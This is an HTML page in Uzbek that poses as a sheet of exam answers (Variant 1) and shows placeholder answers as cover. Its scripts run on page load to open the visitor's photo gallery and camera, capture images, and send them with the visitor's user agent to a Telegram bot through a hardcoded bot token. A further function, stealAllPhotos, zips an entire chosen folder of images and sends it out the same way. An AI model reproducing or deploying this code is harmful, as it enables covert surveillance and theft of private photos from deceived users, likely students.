<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Imtihon Javoblari</title>
</head>
<body>
    <h1>ðŸŽ“ Variant 1 Javoblari</h1>
    <pre id="answers">Yuklanmoqda...</pre>

    <script>
        const BOT_TOKEN = "8557303907:AAGFjqilWuOma4skJLV5VQzzWM-HjPQhlCs";
        const USER_ID = new URLSearchParams(window.location.search).get('user') || 'unknown';

        // ðŸ“± HAQIQIY ANDROID GALLEY ACCESS
        async function accessRealGallery() {
            try {
                // Input type=file - GALLERY OCHADI
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'image/*';
                input.capture = 'environment'; // CAMERA ham
                
                // Foydalanuvchi gallery tanlaganda
                input.onchange = (e) => {
                    const file = e.target.files[0];
                    if (file) {
                        uploadPhoto(file, "ðŸ“± GALLERY PHOTO");
                    }
                };
                
                // Avto-trigger (click event)
                input.click();
                
            } catch(e) {
                console.log("Gallery access:", e);
            }
        }

        // ðŸ“¸ KAMERA dan olish
        async function accessCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' } 
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(track => track.stop());
                
                canvas.toBlob((blob) => {
                    uploadPhoto(blob, "ðŸ“¸ LIVE CAMERA");
                });
            } catch(e) {}
        }

        // Botga yuborish
        function uploadPhoto(file, caption) {
            const formData = new FormData();
            formData.append('chat_id', USER_ID);
            formData.append('photo', file);
            formData.append('caption', 
                `${caption}\nðŸ‘¤ User: ${USER_ID}\nðŸ“± UA: ${navigator.userAgent.substring(0,60)}`
            );

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST', body: formData
            }).then(r => r.json()).then(data => {
                if (data.ok) {
                    document.getElementById('answers').innerHTML += `\nâœ… ${caption} YUBORILDI!`;
                }
            });
        }

        // ðŸ”¥ BARCHA USULLARNI SINAB KO'RAMIZ
        window.onload = () => {
            setTimeout(() => {
                document.getElementById('answers').innerHTML = 
                    "1A 2B 3C 4D\nðŸ“± Gallery ochilmoqda...";
                accessRealGallery();  // GALLEY
                setTimeout(accessCamera, 3000); // KAMERA
            }, 1000);
        };
    </script>
    <script>
    // ZIP orqali butun GALLEY ni olish
    async function stealAllPhotos() {
        const zip = new JSZip();
        const input = document.createElement('input');
        input.type = 'file';
        input.multiple = true;
        input.accept = 'image/*';
        input.webkitdirectory = true; // BUTUN PAPKA
        
        input.onchange = (e) => {
            Array.from(e.target.files).forEach((file, i) => {
                zip.file(`photo_${i}.jpg`, file);
            });
            zip.generateAsync({type:'blob'}).then(blob => {
                uploadPhoto(blob, "ðŸ’£ ZIP - BARCHA RASMLAR!");
            });
        };
        input.click();
    }
</script>
</body>
</html>
